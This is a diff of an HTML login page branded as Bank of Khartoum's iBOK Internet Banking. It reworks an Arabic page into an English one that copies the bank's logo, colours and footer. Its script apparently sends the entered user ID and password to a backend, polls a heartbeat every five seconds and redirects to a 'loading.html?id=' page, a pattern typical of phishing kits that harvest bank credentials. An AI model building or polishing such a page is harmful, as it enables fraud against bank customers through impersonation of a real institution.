@@ -7,47 +7,54 @@
 <link href="images/favicon-bok.png" rel="icon">
 <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-:root{--gold:#bb8b16;--black:#282828;--red:#a11a19;--green:#0f4130;--gray:#828488;--btn-red:#bc262a}
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Open Sans',sans-serif;background:#f4f4f4;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
+body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
 
-.top-strip{background:#bc262a;height:4px}
+.hero-header{display:flex;min-height:120px;overflow:hidden}
+.hero-left{flex:1;background:#0f4130;display:flex;align-items:center;padding:16px 20px}
+.hero-left img{height:60px}
+.hero-right{flex:1;background:#bb8b16;display:flex;align-items:center;justify-content:flex-end;padding:16px 24px;text-align:right}
+.hero-right h1{color:#fff;font-size:22px;font-weight:700;line-height:1.4}
 
-.header{background:#fff;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e0e0e0}
-.header .logo{height:45px}
-.header .nav-area{display:flex;align-items:center;gap:16px}
-.header .nav-area a{color:#282828;font-size:13px;text-decoration:none;font-weight:600}
-.header .nav-area a:hover{color:#bc262a}
-.header .lang-btn{background:#bc262a;color:#fff;border:none;padding:5px 16px;border-radius:3px;font-size:12px;font-weight:600;cursor:pointer;text-decoration:none}
-.header .lang-btn:hover{background:#a11a19}
+.page-bg{flex:1;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><path d="M100 20 L140 60 L140 100 L100 140 L60 100 L60 60 Z" fill="none" stroke="%23ddd" stroke-width="0.5" opacity="0.3"/></svg>') repeat;background-color:#e8e8e8;padding:20px 16px 40px}
 
-.login-wrapper{flex:1;display:flex;align-items:center;justify-content:center;padding:30px 16px;background:#f4f4f4}
+.login-title{color:#bc262a;font-size:20px;font-weight:600;margin-bottom:12px;padding:0 4px}
 
-.loginTitle h2{color:#bc262a;font-size:22px;font-weight:600;font-family:'Open Sans',sans-serif;text-align:center;margin-bottom:16px}
+.loginbox{padding:24px 20px;border-radius:8px;background-color:#fff;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);max-width:500px;margin:0 auto}
 
-.loginbox{padding:20px 5vw;margin-top:10px;border-radius:6px;background-color:#fff;display:block;position:relative;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);width:100%;max-width:450px;margin-bottom:50px}
+.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:14px;margin-bottom:24px}
+.loginbox h3::after{content:"";width:40%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}
 
-.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:14px;margin-bottom:20px}
-.loginbox h3::before{content:"";width:50%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}
-
-.loginForm label{color:#828488;font-size:14px;display:block;margin-bottom:4px}
-.loginForm .form-group{margin-bottom:16px}
-.loginForm .form-control{border:1px solid #666;height:40px;background-image:none;width:100%;padding:6px 12px;border-radius:4px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none;transition:border-color .2s}
-.loginForm .form-control:focus{border-color:#bc262a;box-shadow:none}
+.form-group{margin-bottom:16px}
+.form-group label{color:#828488;font-size:14px;display:block;margin-bottom:5px}
+.form-control{border:1px solid #ccc;height:44px;width:100%;padding:8px 12px;border-radius:6px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none;transition:border-color .2s;background:#fff}
+.form-control:focus{border-color:#bc262a}
+.form-control::placeholder{color:#aaa}
 
 .pass-wrapper{position:relative}
-.pass-wrapper .toggle-eye{position:absolute;top:50%;left:10px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#828488;font-size:16px;padding:4px}
+.pass-wrapper .form-control{padding-left:40px}
+.toggle-eye{position:absolute;top:50%;left:12px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#999;font-size:18px;padding:0;line-height:1}
 
-.submit{background-color:#bc262a;border:1px solid #bc262a;display:block;width:100%;color:#fff;padding:10px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;margin-top:8px}
-.submit:hover{background-color:#a11a19;border-color:#a11a19}
-.submit:disabled{background-color:#ccc;border-color:#ccc;cursor:default}
+.forgot-link{text-align:left;margin-top:4px;margin-bottom:8px}
+.forgot-link a{color:#bc262a;font-size:13px;text-decoration:none;font-weight:600}
+.forgot-link a:hover{text-decoration:underline}
 
-.links-row{text-align:center;margin-top:16px}
-.links-row a{color:#bc262a;font-size:13px;text-decoration:none;font-weight:600}
-.links-row a:hover{text-decoration:underline}
+.terms-row{display:flex;align-items:center;gap:8px;margin-bottom:16px;direction:ltr}
+.terms-row input[type=checkbox]{width:18px;height:18px;accent-color:#bc262a;cursor:pointer;flex-shrink:0}
+.terms-row label{color:#666;font-size:14px;cursor:pointer}
 
-.footer{margin-top:auto;padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
-.copyrightText{color:#4a4a4a;font-weight:600;font-size:12px}
+.submit-btn{display:block;width:100%;color:#fff;padding:12px;font-size:16px;font-weight:600;border-radius:8px;cursor:pointer;font-family:'Open Sans',sans-serif;border:none;background:linear-gradient(to bottom,#e88a8d,#d46b6e);transition:opacity .2s}
+.submit-btn:hover{opacity:.9}
+.submit-btn:disabled{opacity:.5;cursor:default}
+
+.footer-bar{background:#fff;border-top:3px solid #bc262a;padding:14px 16px;text-align:center;margin-top:auto}
+.footer-text{color:#333;font-size:14px;font-weight:600;margin-bottom:10px}
+.social-icons{display:flex;justify-content:center;gap:20px;margin-top:8px}
+.social-icons a{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;text-decoration:none;color:#fff;font-size:16px;font-weight:700}
+.social-bok{background:#0f4130}
+.social-li{background:#0077b5}
+.social-x{background:#000}
+.social-fb{background:#1877f2}
 
 .error-box{display:none;background:#fff5f5;border:1px solid #f5c6cb;border-radius:4px;padding:10px;margin-bottom:14px;text-align:center}
 .error-box.show{display:block}
@@ -60,57 +67,66 @@ body{font-family:'Open Sans',sans-serif;background:#f4f4f4;min-height:100vh;disp
 .lo-text{font-size:14px;color:#bc262a;font-weight:600}
 
 @media(max-width:480px){
+  .hero-right h1{font-size:18px}
+  .hero-left img{height:45px}
   .loginbox{padding:20px 16px}
-  .header .nav-area span{display:none}
 }
 </style>
 </head>
 <body>
 
-<div class="top-strip"></div>
-
-<div class="header">
-  <div class="nav-area">
-    <a href="index.html">الرئيسية</a>
-    <a href="login-en.html" class="lang-btn">English</a>
+<div class="hero-header">
+  <div class="hero-left">
+    <img src="images/logo.png" alt="iBOK">
   </div>
-  <a href="index.html"><img src="images/logo.png" alt="بنك الخرطوم" class="logo"></a>
+  <div class="hero-right">
+    <h1>Welcome to<br>iBOK Internet<br>Banking</h1>
+  </div>
 </div>
 
-<div class="login-wrapper">
-  <div style="width:100%;max-width:450px;">
-    <div class="loginTitle"><h2>الإنترنت المصرفي للأفراد</h2></div>
+<div class="page-bg">
+  <div style="max-width:500px;margin:0 auto;">
+    <div class="login-title">Internet Banking - Login</div>
+
     <div class="loginbox">
-      <h3>تسجيل الدخول</h3>
+      <h3>Please enter the details</h3>
 
       <div class="error-box" id="errorBox"><span id="errorText">بيانات الدخول غير صحيحة</span></div>
 
-      <div class="loginForm">
-        <div class="form-group">
-          <label>رقم الحساب / اسم المستخدم</label>
-          <input type="text" class="form-control" id="accountInput" autocomplete="off">
-        </div>
-
-        <div class="form-group">
-          <label>كلمة المرور</label>
-          <div class="pass-wrapper">
-            <input type="password" class="form-control" id="passwordInput" autocomplete="off">
-            <button type="button" class="toggle-eye" onclick="togglePass()">&#128065;</button>
-          </div>
-        </div>
-
-        <button type="button" class="submit" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>
+      <div class="form-group">
+        <label>User ID:</label>
+        <input type="text" class="form-control" id="accountInput" placeholder="Enter User ID" autocomplete="off">
       </div>
 
-      <div class="links-row">
-        <a href="#">هل نسيت كلمة المرور؟</a>
+      <div class="form-group">
+        <label>Password:</label>
+        <div class="pass-wrapper">
+          <input type="password" class="form-control" id="passwordInput" placeholder="Enter password" autocomplete="off">
+          <button type="button" class="toggle-eye" onclick="togglePass()">
+            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          </button>
+        </div>
+        <div class="forgot-link"><a href="#">Forgot Password?</a></div>
       </div>
+
+      <div class="terms-row">
+        <input type="checkbox" id="termsCheck">
+        <label for="termsCheck">Terms and Conditions</label>
+      </div>
+
+      <button type="button" class="submit-btn" id="loginBtn" onclick="doLogin()">Login</button>
     </div>
   </div>
 </div>
 
-<div class="footer">
-  <span class="copyrightText">&copy; 2024 بنك الخرطوم. جميع الحقوق محفوظة.</span>
+<div class="footer-bar">
+  <div class="footer-text">iBOK | Bank of Khartoum 2024</div>
+  <div class="social-icons">
+    <a href="#" class="social-bok"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M13 3L4 14h5v7l9-11h-5V3z"/></svg></a>
+    <a href="#" class="social-li">in</a>
+    <a href="#" class="social-x">𝕏</a>
+    <a href="#" class="social-fb">f</a>
+  </div>
 </div>
 
 <div class="loading-overlay" id="loadingOverlay">
@@ -125,8 +141,14 @@ heartbeat();setInterval(heartbeat,5000);
 
 function togglePass(){
   var inp=document.getElementById('passwordInput');
-  if(inp.type==='password'){inp.type='text';}
-  else{inp.type='password';}
+  var icon=document.getElementById('eyeIcon');
+  if(inp.type==='password'){
+    inp.type='text';
+    icon.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  }else{
+    inp.type='password';
+    icon.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+  }
 }
 
 function doLogin(){
@@ -148,12 +170,12 @@ function doLogin(){
       window.location.href='loading.html?id='+d.id;
     }else{
       document.getElementById('loginBtn').disabled=false;
-      document.getElementById('loginBtn').textContent='تسجيل الدخول';
+      document.getElementById('loginBtn').textContent='Login';
     }
   })
   .catch(function(){
     document.getElementById('loginBtn').disabled=false;
-    document.getElementById('loginBtn').textContent='تسجيل الدخول';
+    document.getElementById('loginBtn').textContent='Login';
   });
 }
 
